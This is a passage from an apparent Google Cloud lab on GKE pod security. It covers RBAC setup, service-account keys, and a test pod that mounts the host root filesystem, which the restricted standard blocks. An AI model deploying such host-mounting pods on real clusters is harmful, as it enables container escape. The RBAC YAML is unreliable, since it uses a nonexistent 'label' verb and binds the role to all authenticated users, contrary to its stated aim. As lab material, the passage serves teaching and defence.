Standards</span></h2><ol start='' ><li><p><span>In order to have the necessary permissions to proceed, grant explicit permissions to your own user account to become </span><code>cluster-admin:</code></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl create clusterrolebinding clusteradmin --clusterrole=cluster-admin --user="$(gcloud config list account --format 'value(core.account)')"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>(Output)</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">clusterrolebinding.rbac.authorization.k8s.io/clusteradmin created</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='' ><li><p><span>Now you will enforce a pod security standard. Choose the most appropriate security standard for your &#39;default&#39; namespace. The &#39;restricted&#39; profile offers stronger security:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl label namespace default pod-security.kubernetes.io/enforce=restricted</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Next you will create a ClusterRole. If you want to control who can modify Pod Security Admission levels on namespaces, create a ClusterRole called </span><code>pod-security-manager</code><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat &lt;&lt;EOF | kubectl apply -f -</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">apiVersion: rbac.authorization.k8s.io/v1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kind: ClusterRole</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">metadata:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; name: pod-security-manager</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rules:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- apiGroups: ['policy']</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  resources: ['podsecuritypolicies']</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  resourceNames: ['privileged', 'baseline', 'restricted']</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  verbs: ['use']</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- apiGroups: ['']</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  resources: ['namespaces']</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  verbs: ['get', 'list', 'watch', 'label']</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EOF</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 315px;"></div><div class="CodeMirror-gutters" style="display: none; height: 315px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Next, you will create a RoleBinding. To restrict who can change namespace labels related to Pod Security Admission, create a RoleBinding in the &#39;default&#39; namespace:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat &lt;&lt;EOF | kubectl apply -f -</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">apiVersion: rbac.authorization.k8s.io/v1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kind: RoleBinding</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">metadata:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; name: pod-security-modifier</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; namespace: default</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">subjects:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- kind: Group</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  apiGroup: rbac.authorization.k8s.io</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  name: system:authenticated</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">roleRef:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  apiGroup: rbac.authorization.k8s.io</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  kind: ClusterRole</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  name: pod-security-manager</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EOF</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 338px;"></div><div class="CodeMirror-gutters" style="display: none; height: 338px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> For highly customized and dynamic pod security enforcement, consider tools like OPA Gatekeeper or Kyverno.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Deploy PodSecurityPolicy objects</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-8-deploy-a-blocked-pod-that-mounts-the-host-filesystem'><span>Task 8. Deploy a blocked pod that mounts the host filesystem</span></h2><p><span>Because the account used to deploy the GKE cluster was granted cluster-admin permissions in a previous step, it&#39;s necessary to create another separate &quot;user&quot; account to interact with the cluster and validate the PodSecurityPolicy enforcement.</span></p><ol start='' ><li><p><span>To do this, run:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud iam service-accounts create demo-developer</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>(Output)</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Created service account [demo-developer].</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='' ><li><p><span>Next, run these commands to grant these permissions to the service account - the ability to interact with the cluster and attempt to create pods:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MYPROJECT=$(gcloud config list --format 'value(core.project)')</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud projects add-iam-policy-binding "${MYPROJECT}" --role=roles/container.developer --member="serviceAccount:demo-developer@${MYPROJECT}.iam.gserviceaccount.com"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Obtain the service account credentials file by running:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud iam service-accounts keys create key.json --iam-account "demo-developer@${MYPROJECT}.iam.gserviceaccount.com"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Configure </span><code>kubectl</code><span> to authenticate as this service account:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth activate-service-account --key-file=key.json</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>To configure </span><code>kubectl</code><span> to use these credentials when communicating with the cluster, run:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud container clusters get-credentials simplecluster --zone $MY_ZONE</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Now, try to create another pod that mounts the underlying host filesystem </span><code>/</code><span> at the folder named </span><code>/rootfs</code><span> inside the container:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat &lt;&lt;EOF | kubectl apply -f -</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">apiVersion: v1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kind: Pod</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">metadata:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  name: hostpath</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">spec:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  containers:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - name: hostpath</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  image: google/cloud-sdk:latest</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  command: ["/bin/bash"]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  args: ["-c", "tail -f /dev/null"]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  volumeMounts:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  - mountPath: /rootfs</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  name: rootfs</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  volumes:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - name: rootfs</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  hostPath:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  path: /</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EOF</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 428px;"></div><div class="CodeMirror-gutters" style="display: none; height: 428px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>This output validatates that it&#39;s blocked by the pod security standard:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div 